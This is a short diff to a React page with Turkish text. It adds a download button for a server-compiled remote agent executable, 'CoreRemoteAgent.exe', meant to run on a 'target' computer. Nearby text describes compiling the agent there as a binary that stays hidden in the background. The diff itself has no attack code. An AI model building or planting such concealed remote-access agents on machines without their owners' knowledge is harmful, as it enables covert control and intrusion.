@@ -663,6 +663,21 @@ export default function Home() {
                       <strong>Ajan Özelleştirme Mantığı:</strong> Sunucumuz, bu komut tetiklendiğinde C# koduna şirket adınızı ve logonuzu base64 olarak gömer ve hedef makinedeki <code>csc.exe</code> ile makineye özel, arka planda gizlenen bir Windows Forms binary'si olarak derler.
                     </div>
                   </div>
+
+                  <div className="flex flex-col gap-2 border-t border-[#30363d] pt-4 mt-2">
+                    <h4 className="font-semibold text-xs text-[#f0f6fc]">Alternatif: Derlenmiş EXE Olarak İndir</h4>
+                    <p className="text-xs text-[#8b949e]">Ajanı sunucu üzerinde derleyip doğrudan bir <code>.exe</code> dosyası olarak indirebilirsiniz. İndirdiğiniz dosyayı hedef bilgisayarda doğrudan çalıştırabilirsiniz.</p>
+                    <div>
+                      <a
+                        href={`${SERVER_HOST}/api/builder/download-exe?title=${encodeURIComponent(builderTitle)}&server=${encodeURIComponent(builderServer)}`}
+                        download="CoreRemoteAgent.exe"
+                        className="inline-flex items-center gap-2 bg-[#238636] hover:bg-[#2ea043] text-white text-xs font-semibold px-4 py-2.5 rounded transition-all cursor-pointer"
+                      >
+                        <UploadCloud size={14} />
+                        Ajanı İndir (.exe)
+                      </a>
+                    </div>
+                  </div>
                 </div>
 
               </div>
